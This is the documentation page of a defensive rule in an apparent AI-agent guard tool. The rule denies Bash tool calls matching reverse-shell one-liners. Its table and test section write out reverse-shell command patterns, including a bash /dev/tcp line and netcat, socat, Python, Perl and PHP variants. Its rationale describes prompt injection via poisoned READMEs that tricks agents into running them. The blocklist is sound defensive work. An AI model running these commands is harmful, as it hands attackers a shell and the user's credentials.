# `rogue.reverse-shell`

Block reverse-shell and bind-shell shapes.

## What it catches

The canonical post-exploit reverse-shell one-liners:

| Pattern | Example |
|---|---|
| `bash -i >& /dev/tcp/host/port 0>&1` | The classic Bash reverse shell |
| `exec 5<>/dev/tcp/host/port` | File-descriptor variant |
| `nc -e /bin/sh attacker 4444` | Netcat with command-execution |
| `ncat --exec=/bin/bash` | Modern ncat equivalent |
| `socat ... EXEC:/bin/sh` | socat reverse shell |
| `mkfifo /tmp/p && nc … < /tmp/p \| /bin/sh > /tmp/p` | Named-pipe variant |
| `python -c "import socket; s=socket.socket()..."` | Python reverse shell |
| `perl -e "use Socket; ..."` | Perl reverse shell |
| `php -r "fsockopen(...)"` | PHP reverse shell |
| `ruby -e "..TCPSocket.."` | Ruby reverse shell |
| `awk 'BEGIN{...|& "/inet/tcp/..."}'` | awk reverse shell |
| `busybox nc -e` | BusyBox variant |

## Why it matters

A reverse shell is the post-compromise primitive — it gives a remote attacker an interactive shell on the operator's machine. For an AI agent specifically:

- **Prompt-injection driven.** A poisoned README, web page, or issue body can convince the agent that "running this command will fix the build". The command is a reverse shell.
- **Auto-approval bypass.** An agent that has been given broad shell access (a common workflow for migration / refactor agents) can execute these without further prompting.
- **Trust-boundary collapse.** Once the reverse shell is up, every credential the user has — SSH agent sockets, browser sessions, kubectl contexts — is exposed to the attacker.

There is no legitimate agent use of these patterns. They exist exclusively in penetration testing, malware, and post-exploit toolkits.

## False positives

- `nc -l -p 4444` (passive listener, no `-e`) is **not** caught — listening alone is not RCE. If the agent then `nc | bash` from another command, that path is also not caught here (consider pairing with a broader RCE rule).
- `bash -i` alone (without redirection to /dev/tcp) is **not** caught.
- A test fixture or red-team training script that contains a reverse-shell *string* (e.g. in a markdown file) is not affected — this rule only matches `tool: Bash` invocations, not `Read`/`Write` of file content.

## Test it

```bash
agentlock fake-hook --session <id> --tool Bash \
  --command 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
# expect: deny

agentlock fake-hook --session <id> --tool Bash --command 'nc -l 4444'
# expect: allow
```

## Sources

- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
